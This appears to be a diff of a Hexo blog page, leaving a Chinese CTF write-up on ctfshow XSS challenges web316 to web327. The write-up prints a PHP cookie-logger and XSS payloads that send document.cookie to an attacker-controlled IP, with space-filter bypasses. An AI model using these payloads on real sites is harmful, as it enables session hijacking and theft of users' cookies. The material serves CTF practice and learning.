@@ -5,12 +5,14 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Charmersix</title>
+    <title>ctfshow_xss_wp - Charmersix</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    
+    <meta name="description" content="跨站脚本攻击在这一套题目中体现的淋漓尽致。
+web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
+都差不多，比如http://xsscom.com/加载的还比较快,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Charmersix" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -20,16 +22,20 @@
     
     
     <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="Charmersix"/>
-    
+    <meta name="twitter:title" content="ctfshow_xss_wp - Charmersix"/>
+    <meta name="twitter:description" content="跨站脚本攻击在这一套题目中体现的淋漓尽致。
+web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
+都差不多，比如http://xsscom.com/加载的还比较快,"/>
     
     
     
     
     <meta property="og:site_name" content="Charmersix"/>
     <meta property="og:type" content="object"/>
-    <meta property="og:title" content="Charmersix"/>
-    
+    <meta property="og:title" content="ctfshow_xss_wp - Charmersix"/>
+    <meta property="og:description" content="跨站脚本攻击在这一套题目中体现的淋漓尽致。
+web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
+都差不多，比如http://xsscom.com/加载的还比较快,"/>
     
 <link rel="stylesheet" href="/css/diaspora.css">
 
@@ -38,231 +44,113 @@
 <body class="loading">
     <span id="config-title" style="display:none">Charmersix</span>
     <div id="loader"></div>
-    <div class="nav">
-    <ul id="menu-menu" class="menu">
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="//" title="首页" target="_blank" rel="noopener">首页</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/tags/" title="标签" target="_blank" rel="noopener">标签</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/archives/" title="归档" target="_blank" rel="noopener">归档</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/about/" title="关于" target="_blank" rel="noopener">关于</a>
-        </li>
-        
-    </ul>
-	<span class="target"></span>
-	<center>
-	<div class="hitokoto">
-		<span class="typed" id="hitokoto" data-st="true"></span>
-	</div>
-	</center>
-	
-	<p class="footerlinks">
-		<a href="#" class="iconfont icon-null"></a>
-		
-            <a href="https://github.com/Charmersix" title="github" class="iconfont icon-github" target="_blank" rel="noopener"> </a>
-        
-            <a href="mailto:Charmersix@gmail.com" title="email" class="iconfont icon-email" target="_blank" rel="noopener"> </a>
-        
-		<a href="#" class="iconfont icon-null"></a>
-	</p>
-	
-    <p id="copyright">
-        &copy; 2022 John Doe.
-        <span> | </span>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
-        <span> | </span>Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a> by Fechin
-		
-		<span> | </span><a rel="nofollow" href="" target="_blank">冀ICP备10086号</a>
-		
-    </p>
-</div>
-
-<div id="container">
-    
-<div id="screen">
-    <div id="mark">
-        <div class="layer" data-depth="0.4">
-            <img src="/img/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080">
-        </div>
-    </div>
-    <div id="vibrant">
-        <svg viewbox="0 0 2880 1620" height="100%" preserveaspectratio="xMaxYMax slice">
-            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 "/>
-        </svg>
-        <div></div>
-    </div>
-    <div id="header">
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://charmersix.icu"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow_xss_wp</h3>
+    <div class="social">
         <div>
-            <a class="image-logo" href="/"></a>
-			
-			<div class="iconfont icon-search switchsearch" href="/search/" title="搜索"></div>
-			
-            <div class="iconfont icon-menu switchmenu"></div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
         </div>
     </div>
-    
-    <div id="post0">
-        <p>七月 27, 6666</p>
-        <h2><a href="/6666/07/27/welcome-to-my-blog/" title="welcome to my blog" class="posttitle">welcome to my blog</a></h2>
-        <p class="summary">我是Charmersix，这个名字，大家可能不认识，你们可以叫我C&amp;S。是一名小学生ctfer，为了方便自...</p>
-    </div>
-    
+    <div class="scrollbar"></div>
 </div>
 
-    <div id="primary">
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow_xss_wp</h1>
+        <div class="stuff">
+            <span>五月 14, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctfshow/" rel="tag">ctfshow</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>跨站脚本攻击在这一套题目中体现的淋漓尽致。</p>
+<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，</p>
+<p>都差不多，比如<a target="_blank" rel="noopener" href="http://xsscom.com/%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%98%E6%AF%94%E8%BE%83%E5%BF%AB%E3%80%82">http://xsscom.com/加载的还比较快。</a></p>
+<p>我用的自己服务器，贴上一个这个脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我这里建议文件名不要用xss，因为我刚开始用的xss，后边会有题目把xss过滤了。</p>
+<p>payload：</p>
+<p><code>&lt;script&gt;window.location.href=&#39;http://自己服务器IP/a.php?1=&#39;+document.cookie&lt;/script&gt;</code></p>
+<p><code>window.location.href</code>可以理解成是，跳转到href里，具体参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Qian123/p/5345298.html#_label3">https://www.cnblogs.com/Qian123/p/5345298.html#_label3</a></p>
+<p><code>document.cookie</code>就是创建一个cookie,这里是把目标cookie窃取下来，具体参考<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/prop-doc-cookie.html">https://www.runoob.com/jsref/prop-doc-cookie.html</a></p>
+<h3 id="web317-319"><a href="#web317-319" class="headerlink" title="web317-319"></a>web317-319</h3><p>这里属于是一招鲜吃遍天了，这里过滤的东西都不一样，有img，script，xss</p>
+<p>但是payload:</p>
+<p><code>&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>无敌</p>
+<h3 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h3><p>过滤了空格，但是tab或者/或者/**/都可以用</p>
+<p>所以payload:</p>
+<p><code>&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>开始来到存储型XSS，难度起来了。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://music.163.com/song/media/outer/url?id=437909145.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://music.163.com/song/media/outer/url?id=1872306028.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="http://music.163.com/song/media/outer/url?id=31010566.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="http://music.163.com/song/media/outer/url?id=1367609755.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="http://music.163.com/song/media/outer/url?id=1397573144.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="http://music.163.com/song/media/outer/url?id=515453363.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
         
-<div class="post">
-    <a href="/2022/05/14/ctfshow_xss_wp/" title="ctfshow_xss_wp">
-        <img src="https://img-blog.csdnimg.cn/75409c81cbb24349bd1f8a6e525262bb.png" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>五月 14, 2022</p>
-        <h3><a href="/2022/05/14/ctfshow_xss_wp/" title="ctfshow_xss_wp" class="posttitle">ctfshow_xss_wp</a></h3>
-        <p>跨站脚本攻击在这一套题目中体现的淋漓尽致。
-web316跨站脚本攻击，现时跨站，这里我用的自己的服务器，当然也有用各种xss网站的，
-都差不多，比如htt...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/05/12/AngularJS%20xss/" title="没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入">
-        <img src="https://s1.ax1x.com/2022/05/12/O0gJHO.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>五月 12, 2022</p>
-        <h3><a href="/2022/05/12/AngularJS%20xss/" title="没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入" class="posttitle">没有 HTML 的 XSS：使用 AngularJS 的客户端模板注入</a></h3>
-        <p>文章引用自：https://portswigger.net/research/xss-without-html-client-side-template-...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/05/04/web_XSS/" title="Web_XSS">
-        <img src="https://s1.ax1x.com/2022/05/04/OZuNIU.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>五月 04, 2022</p>
-        <h3><a href="/2022/05/04/web_XSS/" title="Web_XSS" class="posttitle">Web_XSS</a></h3>
-        <p>xss也算是web安全必备吧，一直没学，现在补一补
-在这之前先搞清楚xss的原理
-XSS的原理和分类xss呢就是在web页面插入一段恶意的script代码...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/05/03/SkyMirror-WP-simple-flow/" title="SkyMirror_WP_流量分析">
-        <img src="https://img-blog.csdnimg.cn/911ab0bdd88e42a2bfb33221b0b5ab88.png" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>五月 03, 2022</p>
-        <h3><a href="/2022/05/03/SkyMirror-WP-simple-flow/" title="SkyMirror_WP_流量分析" class="posttitle">SkyMirror_WP_流量分析</a></h3>
-        <p>数据包中的线索题目在这儿
-wireshark打开，追踪流一波
-
-这base64编码，来这儿解码一下
-然后就能得到一张图片
-
-flag显而易见
-被偷走的文件...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/05/03/python%20re/" title="python re模块">
-        <img src="https://img-blog.csdnimg.cn/88d32e76872b476694929819c5607765.png" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>五月 03, 2022</p>
-        <h3><a href="/2022/05/03/python%20re/" title="python re模块" class="posttitle">python re模块</a></h3>
-        <p>初识re
-findallfindall : 匹配字符串中所有的符合正则内容
-123import relist = re.findall(r&quot;\d...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/04/30/usb%20wireshark/" title="SkyMirror_WP_USB流量分析">
-        <img src="https://s1.ax1x.com/2022/05/07/Olk8Tx.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>四月 30, 2022</p>
-        <h3><a href="/2022/04/30/usb%20wireshark/" title="SkyMirror_WP_USB流量分析" class="posttitle">SkyMirror_WP_USB流量分析</a></h3>
-        <p>(RoarCTF2019)davinci_cipher_数位板流量分析这是我目前做的比较难的一个流量分析，这题干扰项超级多，但是根据提示能知道是个usb流...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/04/29/webshell/" title="(陇剑杯 2021) webshell系列">
-        <img src="http://kr.shanghai-jiuxin.com/file/2020/1031/e9d17d27dfd693d88b232899538144e8.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>四月 29, 2022</p>
-        <h3><a href="/2022/04/29/webshell/" title="(陇剑杯 2021) webshell系列" class="posttitle">(陇剑杯 2021) webshell系列</a></h3>
-        <p>这是一个大赛原题系列，总共七道题，题目在这儿
-（1）webshell ，想一想，应该是post传输，筛选一下post
-
-随便点开第一个看一下
-
-就有了，或...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/04/29/SQLflow/" title="(陇剑杯 2021) SQL注入系列">
-        <img src="https://s1.ax1x.com/2022/04/29/Lv5n9x.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>四月 29, 2022</p>
-        <h3><a href="/2022/04/29/SQLflow/" title="(陇剑杯 2021) SQL注入系列" class="posttitle">(陇剑杯 2021) SQL注入系列</a></h3>
-        <p>（1）第一题，看SQL注入的语句，很明显是布尔盲注的特征
-（2）这题更没劲，根据我的经验，流量分析倒着看就对了
-
-(select%20flag%20fro...</p>
-    </div>
-</div>
-
-
-<div class="post">
-    <a href="/2022/04/29/ios_flow/" title="(陇剑杯 2021)ios系列">
-        <img src="https://s1.ax1x.com/2022/04/29/LxmiY4.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>四月 29, 2022</p>
-        <h3><a href="/2022/04/29/ios_flow/" title="(陇剑杯 2021)ios系列" class="posttitle">(陇剑杯 2021)ios系列</a></h3>
-        <p>（1）根据经验，没思路就追踪TCP流
-追到15流，会发现一坨东西，翻一翻就能得到。
-
-很明显，3.128.156.159
-（2）还是刚刚追踪的TCP流
-
-...</p>
-    </div>
-</div>
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="false"
+        data-ci="f71ceda7a670da0dc3de"
+        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
+        data-r="blog_comments"
+        data-o="Charmersix"
+        data-a="Charmersix"
+        data-d="false"
+    >查看评论</div>
 
 
     </div>
     
-    <div id="pager"><a href="/page/2/" class="more">加载更多</a></div>
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web316"><span class="toc-number">1.</span> <span class="toc-text">web316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web317-319"><span class="toc-number">2.</span> <span class="toc-text">web317-319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320-web326"><span class="toc-number">3.</span> <span class="toc-text">web320-web326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web327"><span class="toc-number">4.</span> <span class="toc-text">web327</span></a></li></ol>	
+        </div>
     
 </div>
-<div id="preview"></div>
 
 
-
+    </div>
+</div>
 </body>
 
 <script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
